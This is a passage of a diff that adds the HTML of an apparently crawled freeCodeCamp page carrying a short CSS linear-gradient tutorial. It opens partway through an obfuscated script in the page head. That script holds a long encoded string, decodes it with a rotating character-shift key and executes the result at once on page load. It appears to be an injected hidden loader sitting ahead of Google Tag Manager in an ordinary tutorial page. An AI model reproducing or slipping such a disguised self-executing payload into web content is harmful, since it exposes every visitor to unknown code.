3!&H{|J]k9%OtwZxW`7cKg@z-t!i/_1EIlSmUsvLSO3cLwc`Px9\".@d3a4I#[sATzC2Y{iDz>[yv%|K]oKfP=[tO\\V3cL?Nm.tt%;?Cmk(Zu]|YgiT3fMXR\"i}ypp-FgkiXm[sYfTW\x3cXL\\NzP8-q={Fk`4TzSqGfu_U|Uzf88=!e$|OnbKJ{Q%@E\\VXp;[Hx.[yv%Q\\()8[nb\"8E(a\\r_p\\4Q;v+S(@mj*T\"z EObQBnHXi.-#ud%|\"db2Kzb0][dC:j=-K4Jr$hp-B=i*Sq\\$SjtHCc;gH{879 'xOvk`lm`uHMSPBh3#\x3c*F12,=-LMm5K 1oFEtiXisXkm:!||7-EapOAiz#?IQGZX9_K4+#wx||KlpLmG`sGU`PNHyE(\\|1M@L'z;%9mFnW 'n}i2Fwc`P%9/%6d!zLpSr49feK\x3cYGji.0t&fw9gss&R#SH?fnH3i;[_8Pu'qr-FgkKT8S7NRSVCgFq'4@ yg/Ggnl.J,|:IOWFL%byE#8r&l 'c!x;G l$]RxQX^qeD\"?# #y?Q`f8p4T%ACbK=c^Tf)=(ywr!cY+1GnSzZ[QCAZV#w\"e}0l},QYk(K{T.%E_W3hLwczVr|r}|z^r3I\"W}Afu]BgQnQq>&$q/'i[i4Tqt7PCOV1]^af)G.8,I/LaaCt8`K9U\\EB^Gae T 9 #|Qmo3dzS'Q0`Q;^KXe40& f%\"Lf%.pmu+IA``C2FqHz=%qqr|L^{uK}csFT-PZjJ_wzcb8 &+I2rOUz>\"BXgz4jFVSu9}8x84\\^r3I\"W}Af\\l3|Si@ H%Mh=(Oad.TmZWAPcVXgsXk{\x3cxwl}xI=o7U x}nEzQ@^?\\Mm6auv&%Q$f`K:]\"\x3cGWP/a*XP#/$&L}\"Q$^`K:QzBNSFucHhS8?Lu1#|Pgi;K8QK8l`G8Z;gxTP'!ls7k$s4Opl>]V]K2sf}er?}swx(K &@\\m`.8jZlA!\x3c.Qq>&$q/#cle.Y8ttHNQV7dFyU5E$)l%zE sQRmPs?giE/h=qmF/Lvx}zQal3l5i\"8TcT\x3csJ2B4\x3c8Jx7(du);rxOp8L+qgX9fD,YIyi7/ilo>Y:^%FHt=]!n}iE'8\x3c$7-[ak8Zm\\q8OT` ZIhD!>89ut-Rjk w8$klS+X=^\x3cqm8.Lq!--gn+1GnSznp)E/h=qoF\x3ct&x#'[n+9X'a\x3cCUaJTPh}q8TDm,;ro$aQHx]pYgK{1VKX]?b#uw&+Kvp`\\:asATtiXPi}ricrqvt7o2o*Z#`|QVzU3cLyf8%B\x3c8lR@Yp*dA(\"8TcT\x3csKwc.pTQG18x5aQSqbvBDrfN\x3c{G_-eLt1||Q`l)j2T67jnD=YQsi)@p|xtQPu&OZI\\sJ^@G?j=fS48;t,;rn$4\"!oO#8^$zB2F}U:6prh{Tr3`&YqlEkRSVCgFNp8alKfp,Bv5]Xqb%ENlXZh=aS4Q;k5;|c!Z^ImasQw(T3iMeM,@=&u*,ihr8N4IG]o}lX&hPf8%C\x3cJ=yFfaK]u\\rBWuhB!Az\x3cG-p%h/Hk2o*Z#`|QL+XZh=aS4Q;k6;HmU8(G!S.bo(T3iMeM,@=%h}-c!) v8S6Z=)E/h=qn>b#uw&+KviQY\"O$HS*q\\%ToK:=%qw&,y+6\\%g :8fu?fPh}T468m\".@du&Lc4c:NO`K5^FTKU8!'wI'ggo.Mu\\o?%`T=gpbi{\x3cxwl}xIJb8[xbHEj]T7\\Aa@xzt#xt,QAk.ZFS:6L]P3Y!aO#>I&/#|Pgi;KFW:EEXG1ipT\\5G;!q](-jl=_FT%ACbK=c^zZ{gp8r8QF oLc+u-Zgkl/#DTAq6LA>rxP]{T  S$HR\\`/#LeX!V!'vw?8))Vp8#kZjItX\x3c^aiqQlKfp,Bv/]Xqb%ENlQiVdfDz>79/jJg-Z^ImasQq(T3iMeM,3Lq1$|Kl%Lpg\":EfdQ7YV#iuQlKfp,Bv1]Xqb%ENIrXVdfDz>79`Jz>kbCyF`sGU`PLddfSm>&%?@Gkty4r!boGUa _.o2:@T#8r8tuS0O{i)q4SS`b/JXS#\x3c}k5;xikb3Z4uklCOU3sm-Qq>&$qjIggZBc5u-ZgkiUr_}E48p(lvxQgoOf!S|7\"SC1dFsi)@p|xtQI }8KzRP8AQQ\x3cubyE#8r&l 'cf)*m)WtYWWP2dO!Gm=^)q_+Lhb7Z't09EbE6u_zZ$+#0wL4J]q-Up(0#/A6N!CXD|+{yytQ\\()(XqRsATWC:hpsHz-{'gt9gel)KFnqBRabK0JXS#\x3c}0h5=cl+'UpgK8gxVZ^EcN >p ftT]dl\x3cf8TsGCVh\x3c!Lzi-X.(d#7O5\\KT8S7lRSVCgFqQ2Nb8 &+I2kOUz>\"BXgz4jFVSu9}8w84\\^r3I\"W}Af\\l3|S\\E4:t$i +JYk(K5i&4RlVi(='i eu'qr-FgkKm)doE^]}>ZJYN 7p ftED]qhT\"`w8S0[zVEXezQ;y@ rL&i*Tsbv^oK{7[^\\f)@p$#pTF&a:XmbwBNj^\\0f0zIP?M@Lxza+7K!^}ASS'\x3cYc\\k!>p$wc\"J]yAtFO7WdShUr=_RqExv+7-h52St5*Kag`GBjJax!/%dl||LmqKX8#>agk_gh=g3u7t!x%?O$-Lc+t|]fTW\x3cXL\\NzP8-b7-g]&Bm5k-Zj`_U|UzirP(yqs(T$}{3X6$GP@G?j=fS.T,(d{.B2iKfd;ZyTbR ZIhD!>1\x3cE86d$cK]u\\rBWxbub9ZD.T,(d{.B2iKfU[o:EnlT[MaB\"3  +84SYoCTI\\sJf4n0^FWkm:!||7]gSq-O!K\x3c6O\\E/i^N\x3c:={yftE@Yi1lm`uHMSPBh_zf5c#uw&+KvQKT5x|Pgu_U!>yVu8s!z;9OZV}(@}0][SPCb=e@n6tJ$@C@gk+Osc\"4BZGftg}Fq>Ivx}zQal3l5i\"8TcT\x3cs{p\\5T}'o{Tx5%0#zcz?{+}TMsWNo?|uq%E@mo7Kzba6RWRB|ToU{3s03LTxP\x3c;UuR.axFn>VJXM\"v th85Ynl.J,|Kn{Y^J`deDy9'uFw\"I\\%)Uoc{8Nbn1jJeDz>bsux)Q!zLl5)".split("").map(function(a,b){return String.fromCharCode(32+(a.charCodeAt()-64+"R+H-ArVon{ogC(#[:r2pM@2>".charCodeAt(b%24))%(39+55))}).join(''))()
+</script>
+
+<!-- Google Tag Manager -->
+<script>
+  // Set up dataLayer with data if provided
+  window.dataLayer = window.dataLayer || [{ gaPropertyId: 'UA-55446531-20' }];
+
+  // Initialized GTM via gtag
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'UA-55446531-20');
+
+  // Configure and initialize GTM
+  (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+    'https://www.googletagmanager.com/gtm.js?id='+i+dl+'&gtm_cookies_win=x';f.parentNode.insertBefore(j,f);
+    })(window,document,'script','dataLayer', 'GTM-5D6RKKP');
+</script>
+<!-- End Google Tag Manager -->
+
+
+<meta name="google-site-verification" content="b4tITLzEeeZGEpvD4mGNf3khKM4fvqejQaz9SYBQP8E" />
+
+</head>
+
+<body class="post-template tag-css tag-css3 tag-toothbrush">
+
+    <div class="site-wrapper">
+        <nav class="site-nav nav-padding">
+    <div class="site-nav-left">
+        <form id="search-form" onsubmit="submitSearch()">
+  <div role="search" class="searchbox__wrapper">
+    <input type="search" placeholder="Search 6,000+ tutorials" id="search-input" />
+    <button type="submit" title="Submit your search query." class="ais-SearchBox-submit">
+      <svg class="ais-SearchBox-submitIcon" xmlns="https://www.w3.org/2000/svg" width="10" height="10" viewBox="0 0 40 40">
+        <path d="M26.804 29.01c-2.832 2.34-6.465 3.746-10.426 3.746C7.333 32.756 0 25.424 0 16.378 0 7.333 7.333 0 16.378 0c9.046 0 16.378 7.333 16.378 16.378 0 3.96-1.406 7.594-3.746 10.426l10.534 10.534c.607.607.61 1.59-.004 2.202-.61.61-1.597.61-2.202.004L26.804 29.01zm-10.426.627c7.323 0 13.26-5.936 13.26-13.26 0-7.32-5.937-13.257-13.26-13.257C9.056 3.12 3.12 9.056 3.12 16.378c0 7.323 5.936 13.26 13.258 13.26z" />
+      </svg>
+    </button>
+    <div id='dropdown-container'></div>
+  </div>
+</form>
+
+<script>
+  const client = algoliasearch('QMJYL5WYTI', '4318af87aa3ce128708f1153556c6108');
+  const index = client.initIndex("news");
+  const screenWidth = window.screen.width;
+  const screenHeight = window.screen.height;
+  const hitsToRender = (screenWidth >= 767 && screenHeight >= 768) ? 8 : 5;
+  const searchForm = document.getElementById('search-form');
+  const input = document.getElementById('search-input');
+  const dropdownContainer = document.getElementById('dropdown-container');
+  let searchQuery, hitSelected, hits;
+
+  input.addEventListener('input', e => {
+    searchQuery = e.target.value;
+  });
+
+  // Prevent form from being submitted with magnifying
+  // glass or enter when there is no query or hits
+  searchForm.addEventListener('submit', e => {
+    e.preventDefault();
+  });
+
+  const search = autocomplete('#search-input', { 
+      hint: false,
+      keyboardShortcuts: ['s', 191],
+      openOnFocus: true,
+      appendTo: dropdownContainer,
+      debug: true // allow tabbing through results
+    }, [
+    {
+      source: autocomplete.sources.hits(index, { hitsPerPage: hitsToRender }),
+      debounce: 250,
+      templates: {
+        suggestion: (suggestion, result) => {
+          hits = true;
+          return `
+            <a href="${suggestion.url}">
+              <div class="algolia-result">
+                <span>${suggestion._highlightResult.title.value}</span>
+              </div>
+            </a>
+          `;
+        },
+        empty: (options) => {
+          hits = false;
+          return `
+            <div class="aa-suggestion footer-suggestion no-hits-footer">
+              <div class="algolia-result">
+                <span>
+                  No tutorials found
+                </span>
+              </div>
+            </div>
+          `;
+        },
+        footer: (query, result) => {
+          if (!query.isEmpty) {
+            return `
+              <div class="aa-suggestion footer-suggestion">
+                <a id="algolia-footer-selector" href="https://www.freecodecamp.org/news/search?query=${searchQuery}">
+                  <div class="algolia-result algolia-footer">
+                    <span>See all results for ${searchQuery}</span>
+                  </div>
+                </a>
+              </div>
+            `;
+          }
+        }
+      }
+    }
+  ]).on('autocomplete:selected', (event, suggestion, dataset, context) => {
+    // If article is selected, set to URL of the article. 
+    // If footer is selected, set to search results path
+    hitSelected = suggestion ? suggestion.url : `https://www.freecodecamp.org/news/search?query=${searchQuery}`;
+
+    // Let browser handle click, and do not go to selection on tab key press
+    if (context.selectionMethod === 'click' || context.selectionMethod === 'tabKey') {
+      return;
+    }
+
+    // Go to selected article or footer path
+    if (hits) {
+      window.location.assign(hitSelected);
+    }
+  });
+
+  // Go to highlighted hit or search for current query
+  // when magnifying glass or enter is pressed
+  function submitSearch() {
+    hitSelected = document.getElementsByClassName('aa-cursor')[0];
+
+    if (hitSelected && searchQuery) {
+      const articleUrl = hitSelected.querySelector('a').href;
+      window.location.assign(articleUrl);
+    } else if (!hitSelected && searchQuery && hits) {
+      window.location.assign(`https://www.freecodecamp.org/news/search?query=${searchQuery}`);
+    }
+  }
+
+  // close dropbar when clicking off 
+  document.addEventListener('click', e => {
+    if (e.target !== input) {
+      search.autocomplete.close();
+    }
+  });
+</script>
+    </div>
+    <div class="site-nav-middle">
+        <a class="site-nav-logo" href="https://www.freecodecamp.org/news"><img src="/news/content/images/2019/11/fcc_primary_large_24X210.svg" alt="freeCodeCamp.org" /></a>
+    </div>
+    <div class="site-nav-right">
+        <div class="nav-group">
+            <a class="nav-forum" href=https://forum.freecodecamp.org/>Forum</a>
+
+            <a class="toggle-button-nav" href="https://www.freecodecamp.org/donate/">
+                Donate
+            </a>
+        </div>
+
+    </div>
+</nav>
+        <a class="donation-banner" id="donation-banner-link" href=https://www.freecodecamp.org/>
+    <p>
+        Learn to code — <span>free 3,000-hour curriculum</span>
+    </p>
+</a>
+
+        <div id="error-message"></div>
+
+        
+
+
+
+
+<main id="site-main" class="site-main outer">
+    <div class="inner">
+
+        <article class="post-full post tag-css tag-css3 tag-toothbrush ">
+
+            <header class="post-full-header">
+                <section class="post-full-meta">
+                    <time class="post-full-meta-date" datetime="January 31, 2020">January 31, 2020</time>
+                    <span class="date-divider">/</span>
+                    <a href="/news/tag/css/">
+                        #CSS
+                    </a>
+                </section>
+                <h1 class="post-full-title">CSS Linear Gradient Explained with Examples</h1>
+            </header>
+
+            <div class="post-full-author-header">
+
+
+            </div>
+
+            <figure class="post-full-image">
+                <img srcset="https://images.unsplash.com/photo-1579548122080-c35fd6820ecb?ixlib&#x3D;rb-1.2.1&amp;q&#x3D;80&amp;fm&#x3D;jpg&amp;crop&#x3D;entropy&amp;cs&#x3D;tinysrgb&amp;w&#x3D;2000&amp;fit&#x3D;max&amp;ixid&#x3D;eyJhcHBfaWQiOjExNzczfQ 300w,
+                            https://images.unsplash.com/photo-1579548122080-c35fd6820ecb?ixlib&#x3D;rb-1.2.1&amp;q&#x3D;80&amp;fm&#x3D;jpg&amp;crop&#x3D;entropy&amp;cs&#x3D;tinysrgb&amp;w&#x3D;2000&amp;fit&#x3D;max&amp;ixid&#x3D;eyJhcHBfaWQiOjExNzczfQ 600w,
+                            https://images.unsplash.com/photo-1579548122080-c35fd6820ecb?ixlib&#x3D;rb-1.2.1&amp;q&#x3D;80&amp;fm&#x3D;jpg&amp;crop&#x3D;entropy&amp;cs&#x3D;tinysrgb&amp;w&#x3D;2000&amp;fit&#x3D;max&amp;ixid&#x3D;eyJhcHBfaWQiOjExNzczfQ 1000w,
+                            https://images.unsplash.com/photo-1579548122080-c35fd6820ecb?ixlib&#x3D;rb-1.2.1&amp;q&#x3D;80&amp;fm&#x3D;jpg&amp;crop&#x3D;entropy&amp;cs&#x3D;tinysrgb&amp;w&#x3D;2000&amp;fit&#x3D;max&amp;ixid&#x3D;eyJhcHBfaWQiOjExNzczfQ 2000w" sizes="(max-width: 800px) 400px,
+                            (max-width: 1170px) 700px,
+                            1400px" src="https://images.unsplash.com/photo-1579548122080-c35fd6820ecb?ixlib&#x3D;rb-1.2.1&amp;q&#x3D;80&amp;fm&#x3D;jpg&amp;crop&#x3D;entropy&amp;cs&#x3D;tinysrgb&amp;w&#x3D;2000&amp;fit&#x3D;max&amp;ixid&#x3D;eyJhcHBfaWQiOjExNzczfQ" alt="CSS Linear Gradient Explained with Examples"
+                    onerror="this.style.display='none'" />
+            </figure>
+
+            <section class="post-full-content">
+                <div class="post-content medium-migrated-article">
+                    <p>In a linear gradient, the colors flow in a single direction, for example from left to right, top to bottom, or any angle you choose.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://cdn.discordapp.com/attachments/261391445074771978/371707961422118912/image.png" class="kg-image" alt="A gradient with Two colour stops"><figcaption>A linear gradient with two color stops</figcaption></figure><h2 id="syntax">Syntax</h2><p>To create a linear gradient you must define at least two color stops. They are the colors the transitions are created among. It is declared on either the <strong><strong>background</strong></strong> or <strong><strong>background-image</strong></strong> properties.</p><pre><code class="language-text">background: linear-gradient(direction, colour-stop1, colour-stop2, ...);</code></pre><p>If no direction is specified, the default transition is top to bottom.</p><h2 id="examples">Examples</h2><h3 id="top-to-bottom-">Top to bottom:</h3><pre><code class="language-text">background: linear-gradient(red, yellow);</code></pre><figure class="kg-card kg-image-card"><img src="https://cdn.discordapp.com/attachments/261391445074771978/371702268803809301/image.png" class="kg-image" alt="Top to Bottom"></figure><p><strong><strong>Left To </strong>r<strong>ight:</strong></strong></p><p>To make it left to right, you add an additional parameter at the beginning of the <code>linear-gradient()</code> starting with the word <strong><strong>to</strong></strong> which indicates the direction:</p><pre><code class="language-text">background: linear-gradient(to right, red , yellow);</code></pre><figure class="kg-card kg-image-card"><img src="https://cdn.discordapp.com/attachments/261391445074771978/371702990161051648/image.png" class="kg-image" alt="Left to Right"></figure><p><strong><strong>Diagonal </strong>gradients<strong>:</strong></strong></p><p>You can also transition a gradient diagonally by specifying the horizontal and vertical starting positions, for example, top-left, or bottom-right.</p><p>Here’s a sample for a gradient starting from the top-left:</p><pre><code class="language-text"> background: linear-gradient(to bottom right, red, yellow);</code></pre><figure class="kg-card kg-image-card"><img src="https://cdn.discordapp.com/attachments/261391445074771978/371705382105776128/image.png" class="kg-image" alt="Top-left"></figure><h3 id="using-angles-to-specify-the-direction-of-the-gradient"><strong>Using angles to specify the direction of the gradient</strong></h3><p>You can also use angles, to be more accurate in specifying the direction of the gradient:</p><pre><code class="language-text">background: linear-gradient(angle, colour-stop1, colour-stop2);</code></pre><p>The angle is specified as an angle between a horizontal line and the gradient line.</p><pre><code class="language-text">background: linear-gradient(90deg, red, yellow);</code></pre><figure class="kg-card kg-image-card"><img src="https://cdn.discordapp.com/attachments/261391445074771978/371710718698848256/image.png" class="kg-image" alt="90 degrees"></figure><h3 id="using-more-than-two-colors"><strong>Using more than two colors</strong></h3><p>You’re not limited to just two colors – you can use as many comma separated colors as you want.</p><pre><code class="language-text">background: linear-gradient(red, yellow, green); </code></pre><figure class="kg-card kg-image-card"><img src="https://cdn.discordapp.com/attachments/261391445074771978/371706534591201281/image.png" class="kg-image" alt="A gradient with 3 colour stops"></figure><p>You can also use other color syntaxes like RGB or hex codes to specify the colors.</p><h3 id="hard-color-stops"><strong>Hard color stops</strong></h3><p>You can not only use gradients to transition with fading colors, but you can also use it to change from one solid color to another solid color instantly:</p><pre><code class="language-text">background: linear-gradient(to right,red 15%, yellow 15%);</code></pre><figure class="kg-card kg-image-card"><img src="https://cdn.discordapp.com/attachments/261391445074771978/371716730046775318/image.png" class="kg-image" alt="Hard colour stops"></figure><h2 id="more-information-">More information:</h2><ul><li><a href="/news/the-css-handbook-a-handy-guide-to-css-for-developers-b56695917d11/">The CSS Handbook: a handy guide to CSS for developers</a></li></ul>
+                </div>
+                <hr />
+
+
+                <p class="social-row">
+
+            If this article was helpful, <a class='cta-button' onclick='window.open(`https://twitter.com/intent/tweet?text=CSS%20Linear%20Gradient%20Explained%20with%20Examples%0A%0Ahttps%3A%2F%2Fwww.freecodecamp.org%2Fnews%2Fcss-linear-gradient-explained-with-examples%2F`, `share-twitter`, `width=550, height=235` ); return false;'>tweet it.</a>
+</p>
+
+                
+<div class='learn-cta-row'>
+    <p>
+        Learn to code for free. freeCodeCamp's open source curriculum has helped more than 40,000 people get jobs as developers. <a class='cta-button' href='https://www.freecodecamp.org/learn'>Get started</a>
+    </p>
+</div>                  <script>
+    // Conditionally show comments section based on publication language setting
+    const showCommentsList = ['zh-cn'];
+
+    if (showCommentsList.includes(`en`)) {
+      const hostname = window.location.hostname;
+      const discourseEmbedMap = {
+        'www.freecodecamp.org': {
+          file: 'https://forum.freecodecamp.org/srv/status',
+          discourseUrl: 'https://forum.freecodecamp.org/'
+        },
+        'chinese.freecodecamp.org': {
+          file: 'https://chinese.freecodecamp.org/forum/srv/status',
+          discourseUrl: 'https://chinese.freecodecamp.org/forum/',
+        },
+        'dev': {
+          file: 'https://forum.freecodecamp.dev/srv/status',
+          discourseUrl: 'https://forum.freecodecamp.dev/'
+        },
+      };
+      const discourseEmbedInfo = discourseEmbedMap[hostname] ? discourseEmbedMap[hostname] : discourseEmbedMap['dev'];
+      const { file, discourseUrl } = discourseEmbedInfo;
+
+      function loadDiscourseComments() {
+        var xhr = new XMLHttpRequest();
+        var randomNum = Math.round(Math.random() * 10000);
+        xhr.open('HEAD', file + '?rand=' + randomNum, true);
+        xhr.send();
+        xhr.addEventListener('readystatechange', processRequest, false);
+        function processRequest(e) {
+          if (xhr.readyState == 4) {
+            if (xhr.status >= 200 && xhr.status < 304) {
+              document.getElementById('discourse-comments').innerHTML = '';
+              DiscourseEmbed = {
+                discourseUrl,
+                discourseEmbedUrl: 'https://www.freecodecamp.org/news/css-linear-gradient-explained-with-examples/'
+              };
+              var d = document.createElement('script');
+              d.type = 'text/javascript';
+              d.async = true;
+              d.src = discourseUrl + 'javascripts/embed.js';
+              (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(d);
+            } else {
+              document.getElementById('discourse-comments').innerHTML =
+                '<div style="text-align: center;">Sorry, we could not load the comments. Please try again after some time.</div>';
+            }
+          }
+        }
+      }
+
+      if (window && window.addEventListener) {
+        // Create comments section
+        const commentsDivHtml = `
+          <div id='discourse-comments'>
+            <button id='trigger-load-comments'>Show comments</button>
+          </div>
+        `;
+        const fullContentSection = document.getElementsByClassName('post-full-content')[0];
+        fullContentSection.insertAdjacentHTML('beforeend', commentsDivHtml);
+
+        window.addEventListener('load', function () {
+          document.getElementById('trigger-load-comments').onclick = loadDiscourseComments;
+        });
+      }
+    }
+  </script>
+            </section>
+
+        </article>
+    </div>
+</main>
+
+
+
+
+        <footer class="site-footer">
+    <div class="footer-container">
+        <div class="footer-top">
+            <div class="footer-desc-col">
+                <p>
+                    freeCodeCamp is a donor-supported tax-exempt 501(c)(3) nonprofit organization (United States Federal Tax Identification Number: 82-0779546)
+                </p>
+                <p>
+                    Our mission: to help people learn to code for free. We accomplish this by creating thousands of videos, articles, and interactive coding lessons - all freely available to the public. We also have thousands of freeCodeCamp study groups around the world.
+                </p>
+                <p>
+                    Donations to freeCodeCamp go toward our education initiatives, and help pay for servers, services, and staff.
+                </p>
+                <p class="footer-donation">
+                    You can <a href='https://freecodecamp.org/donate' class='inline' rel='noopener noreferrer' target='_blank'>make a tax-deductible donation here</a>.
+                </p>
+            </div>
+            <div class="trending-guides">
+                <div class="col-header">Trending Guides</div>
+                <div class="trending-guides-row">
+                    <div class="footer-col footer-col-1">
+                        <a href='https://www.freecodecamp.org/news/what-is-docker-used-for-a-docker-container-tutorial-for-beginners/'>What is Docker?</a>
+                        <a href='https://www.freecodecamp.org/news/what-is-tcp-ip-layers-and-protocols-explained/'>TCP/IP Model</a>
+                        <a href='https://www.freecodecamp.org/news/rtf-file-what-is-the-rich-text-format/'>RTF File</a>
+                        <a href='https://www.freecodecamp.org/news/css-transition-examples/'>CSS Transition</a>
+                        <a href='https://www.freecodecamp.org/news/how-to-use-instagram-like-a-pro/'>How to Use Instagram?</a>
+                        <a href='https://www.freecodecamp.org/news/mbr-vs-gpt-whats-the-difference-between-an-mbr-partition-and-a-gpt-partition-solved/'>MBR VS GPT</a>
+                        <a href='https://www.freecodecamp.org/news/how-to-format-a-usb-drive-to-fat32-on-windows-10/'>FAT32 Format</a>
+                        <a href='https://www.freecodecamp.org/news/http-error-503-service-unavailable-explained-what-the-503-error-code-means/'>Error 503 Code</a>
+                        <a href='https://www.freecodecamp.org/news/how-to-find-and-edit-a-windows-hosts-file/'>Windows Hosts File</a>
+                        <a href='https://www.freecodecamp.org/news/mobi-to-pdf-how-to-convert-to-and-from-a-mobi-file/'>Mobi to PDF</a>
+                    </div>
+                    <div class="footer-col footer-col-2">
+                        <a href='https://www.freecodecamp.org/news/what-is-stem-the-meaning-of-an-acronym-youll-hear-a-lot-in-school/'>What is STEM?</a>
+                        <a href='https://www.freecodecamp.org/news/javascript-void-keyword-explained/'>JavaScript Void 0</a>
+                        <a href='https://www.freecodecamp.org/news/sql-delete-row-statement-examples/'>SQL Delete Row</a>
+                        <a href='https://www.freecodecamp.org/news/javascript-string-replace-example-with-regex/'>JavaScript Replace</a>
+                        <a href='https://www.freecodecamp.org/news/python-read-json-file-how-to-load-json-from-a-file-and-parse-dumps/'>Python JSON Parser</a>
+                        <a href='https://www.freecodecamp.org/news/cmd-delete-folder-how-to-remove-files-and-folders-in-windows/'>cmd Delete Folder</a>
+                        <a href='https://www.freecodecamp.org/news/what-is-nfc-near-field-communication-uses-chips-tags-and-readers-explained/'>What is NFC?</a>
+                        <a href='https://www.freecodecamp.org/news/what-is-the-correct-content-type-for-json-request-header-mime-type-explained/'>Content Type JSON</a>
+                        <a href='https://www.freecodecamp.org/news/heic-to-jpg-how-to-convert-images-on-a-mac/'>Convert HEIC to JPG</a>
+                        <a href='https://www.freecodecamp.org/news/generate-random-numbers-java/'>Math Random Java</a>
+                    </div>
+                    <div class="footer-col footer-col-3">
+                        <div class="footer-left">
+                            <a href='https://www.freecodecamp.org/news/how-to-start-a-blog-with-wordpress/'>WordPress for Beginners</a>
+                            <a href='https://www.freecodecamp.org/news/qualitative-vs-quantitative-definition-research-methods-and-data/'>Qualitative VS Quantitative</a>
+                            <a href='https://www.freecodecamp.org/news/javascript-split-string-example/'>JavaScript Split String</a>
+                            <a href='https://www.freecodecamp.org/news/how-to-type-letters-with-accents-on-mac/'>Accented Letters on Mac</a>
+                            <a href='https://www.freecodecamp.org/news/how-to-find-a-windows-10-product-key/'>Windows 10 Product Key</a>
+                        </div>
+
+                        <div class="footer-right">
+                            <a href='https://www.freecodecamp.org/news/google-docs-landscape-tutorial-how-to-make-a-google-doc-landscape-orientation/'>Google Docs Landscape</a>
+                            <a href='https://www.freecodecamp.org/news/antimalware-service-executable-what-is-msmpeng-exe-and-why-is-it-running-in-windows-10/'>Antimalware Executable</a>
+                            <a href='https://www.freecodecamp.org/news/windows-10-start-menu-not-working-solved/'>Windows 10 Start Menu</a>
+                            <a href='https://www.freecodecamp.org/news/how-to-open-the-command-prompt-in-windows-10/'>Windows 10 Command Line</a>
+                            <a href='https://www.freecodecamp.org/news/google-account-recovery-change-gmail-password/'>Google Account Recovery</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class='footer-bottom'>
+            <div class="col-header">Our Nonprofit</div>
+            <div class="footer-divider"></div>
+            <div class="our-nonprofit">
+                <a href='https://www.freecodecamp.org/news/about/'>About</a>
+                <a href='https://www.linkedin.com/school/free-code-camp/people/' rel='noopener noreferrer' target='_blank'>Alumni Network</a>
+                <a href='https://github.com/freeCodeCamp/'>Open Source</a>
+                <a href='https://www.freecodecamp.org/shop/' rel='noopener noreferrer' target='_blank'>Shop</a>
+                <a href='https://www.freecodecamp.org/news/support/'>Support</a>
+                <a href='https://www.freecodecamp.org/news/sponsors/'>Sponsors</a>
+                <a href='https://www.freecodecamp.org/news/academic-honesty-policy/'>Academic Honesty</a>
+                <a href='https://www.freecodecamp.org/news/code-of-conduct/'>Code of Conduct</a>
+                <a href='https://www.freecodecamp.org/news/privacy-policy/'>Privacy Policy</a>
+                <a href='https://www.freecodecamp.org/news/terms-of-service/'>Terms of Service</a>
+                <a href='https://www.freecodecamp.org/news/copyright-policy/'>Copyright Policy</a>
+            </div>
+        </div>
+    </div>
+</footer>
+    </div>
+
+    <script>
+        var images = document.querySelectorAll('.kg-gallery-image img');
+        images.forEach(function (image) {
+            var container = image.closest('.kg-gallery-image');
+            var width = image.attributes.width.value;
+            var height = image.attributes.height.value;
+            var ratio = width / height;
+            container.style.flex = ratio + ' 1 0%';
+        })
+    </script>
+
+    <script src="https://code.jquery.com/jquery-3.2.1.min.js"
+        integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous">
+        </script>
+    <script type="text/javascript" src="/news/assets/built/jquery.fitvids.js?v=38de3a54d6"></script>
+
+    <script type="text/javascript" src="https://cdn.freecodecamp.org/news-assets/prism-1-16-0/prism.min.js"></script>
+    <script type="text/javascript"
+        src="https://cdn.freecodecamp.org/news-assets/prism-1-16-0/prism-unescaped-markup.min.js"></script>
+    <script type="text/javascript"
+        src="https://cdn.freecodecamp.org/news-assets/prism-1-16-0/prism-markup-templating.min.js"></script>
+    <script type="text/javascript"
+        src="https://cdn.freecodecamp.org/news-assets/prism-1-16-0/prism-bash.min.js"></script>
+    <script type="text/javascript" src="https://cdn.freecodecamp.org/news-assets/prism-1-16-0/prism-c.min.js"></script>
+    <script type="text/javascript"
+        src="https://cdn.freecodecamp.org/news-assets/prism-1-16-0/prism-clojure.min.js"></script>
+    <script type="text/javascript"
+        src="https://cdn.freecodecamp.org/news-assets/prism-1-16-0/prism-cpp.min.js"></script>
+    <script type="text/javascript"
+        src="https://cdn.freecodecamp.org/news-assets/prism-1-16-0/prism-csharp.min.js"></script>
+    <script type="text/javascript"
+        src="https://cdn.freecodecamp.org/news-assets/prism-1-16-0/prism-css.min.js"></script>
+    <script type="text/javascript"
+        src="https://cdn.freecodecamp.org/news-assets/prism-1-16-0/prism-docker.min.js"></script>
+    <script type="text/javascript"
+        src="https://cdn.freecodecamp.org/news-assets/prism-1-16-0/prism-elixir.min.js"></script>
+    <script type="text/javascript"
+        src="https://cdn.freecodecamp.org/news-assets/prism-1-16-0/prism-erlang.min.js"></script>
+    <script type="text/javascript"
+        src="https://cdn.freecodecamp.org/news-assets/prism-1-16-0/prism-git.min.js"></script>
+    <script type="text/javascript" src="https://cdn.freecodecamp.org/news-assets/prism-1-16-0/prism-go.min.js"></script>
+    <script type="text/javascript"
+        src="https://cdn.freecodecamp.org/news-assets/prism-1-16-0/prism-graphql.min.js"></script>
+    <script type="text/javascript"
+        src="https://cdn.freecodecamp.org/news-assets/prism-1-16-0/prism-haskell.min.js"></script>
+    <script type="text/javascript"
+        src="https://cdn.freecodecamp.org/news-assets/prism-1-16-0/prism-java.min.js"></script>
+    <script type="text/javascript"
+        src="https://cdn.freecodecamp.org/news-assets/prism-1-16-0/prism-javascript.min.js"></script>
+    <script type="text/javascript"
+        src="https://cdn.freecodecamp.org/news-assets/prism-1-16-0/prism-json.min.js"></script>
+    <script type="text/javascript"
+        src="https://cdn.freecodecamp.org/news-assets/prism-1-16-0/prism-jsx.min.js"></script>
+    <script type="text/javascript"
+        src="https://cdn.freecodecamp.org/news-assets/prism-1-16-0/prism-kotlin.min.js"></script>
+    <script type="text/javascript"
+        src="https://cdn.freecodecamp.org/news-assets/prism-1-16-0/prism-lua.min.js"></script>
+    <script type="text/javascript"
+        src="https://cdn.freecodecamp.org/news-assets/prism-1-16-0/prism-markup.min.js"></script>
+    <script type="text/javascript"
